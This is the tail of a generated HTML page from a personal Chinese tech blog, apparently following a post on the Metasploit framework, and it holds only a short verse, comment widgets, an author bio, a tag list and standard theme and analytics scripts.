+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/11.4kfdjzzj0tk0.png" alt="11"></p>
+</blockquote>
+<hr>
+<center>小时候在大人的教育下崇拜他；</center>
+<center>少年时在敌人的忽悠下怀疑他；</center>
+<center>长大后在自己的探索中敬佩他。</center>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/11.7heiufv33wg0.jpg" alt="11"></p>
+<hr>
+      </article>
+    </section>
+
+    
+    <article class="ui segment post-disqus-area" data-html2canvas-ignore>
+      <div id="disqus_thread"></div>
+      <script>
+        
+
+
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/fool-boop.github.io\/posts\/msf%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8\/';  
+          this.page.identifier = '\/posts\/msf%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8\/'; 
+        };
+
+        (function() { 
+          var d = document, s = d.createElement('script');
+          s.src = 'https://' + '...' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </article>
+    
+
+    
+    <article class="ui segment utterances-comments" data-html2canvas-ignore>
+      <script
+        src="https://utteranc.es/client.js"
+        repo="fool-boop/fool-boop.github.io"
+        issue-term="og:title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+      </script>
+    </article>
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2021 叱月的小冰窖</p>
+              
+
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/head.jpeg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">叱月的个人博客<div class="sub header">有一天，蜗牛也会变“佬”……</div>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="归档"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="所有分类"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="所有标签"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/docker/" title="Docker">
+              Docker
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/kali%E6%B8%97%E9%80%8F/" title="Kali渗透">
+              Kali渗透
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/mysql/" title="Mysql">
+              Mysql
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/ruoyi/" title="Ruoyi">
+              Ruoyi
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E4%BC%98%E5%8C%96/" title="优化">
+              优化
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E5%AE%B9%E5%99%A8%E5%8C%96/" title="容器化">
+              容器化
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E6%84%9F%E6%A6%82/" title="感概">
+              感概
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="网络安全">
+              网络安全
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/" title="项目部署">
+              项目部署
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <div class="ui medium header">关于我</div>
+      <p>叱月❤️的 ❤️ 博客</p>
+<p>记录一些技术上的事</p>
+<p>一名大四学生🕯️</p>
+<p><del>马上毕业于青岛理工大学琴岛学院</del></p>
+<p>&ndash; 2021 年 07 月 2 日更新</p>
+
+    </article>
+  </div>
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">社交链接</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+
+  
+  <div class="item">
+    <a href="mailto:wtl3577@163.com">
+      <i class="large mail icon" title="Email"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <div class="item">
+    <a href="https://github.com/fool-boop" target="_blank">
+      <i class="large github icon" title="GitHub"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </div>
+
+  
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark = "#363636"
+  window.backgroundImageDark = "/me/background-dark.jpg"
+  window.darkNav =  null 
+  window.hasTwitterEmbed =  null 
+  window.maxTags =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0/build/global/luxon.min.js"></script>
+
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
+
+
+
+<script>
+  hljs.initHighlightingOnLoad()
+  setHighlightTheme()
+
+  function setHighlightTheme() {
+    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
+    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
+
+    var lightTheme = "tomorrow"
+    var darkTheme = "tomorrow-night"
+    var theme = isDark === 'y' ? darkTheme : lightTheme
+
+    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
+    $('pre').css('background', isDark === 'y' ? '#333' : '')
+  }
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+    <div class="ui inverted segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="搜索一下" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/fool-boop.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: true,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', '...', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+  </body>
+</html>
